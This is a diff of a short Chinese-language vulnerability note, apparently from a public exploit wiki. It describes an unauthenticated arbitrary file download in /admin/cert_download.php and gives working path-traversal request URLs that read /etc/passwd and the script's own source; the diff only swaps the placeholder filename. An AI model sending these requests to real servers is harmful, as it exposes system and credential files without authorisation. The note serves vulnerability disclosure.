@@ -35,13 +35,13 @@ exit();
 此文件没有对身份进行校验即可下载任意文件
 
 ```
-/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
+/admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd
 ```
 
 ![](http://wikioss.peiqi.tech/vuln/qax-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```
-/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
+/admin/cert_download.php?file=test.txt&certfile=cert_download.php
 ```
 
 ![](http://wikioss.peiqi.tech/vuln/qax-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
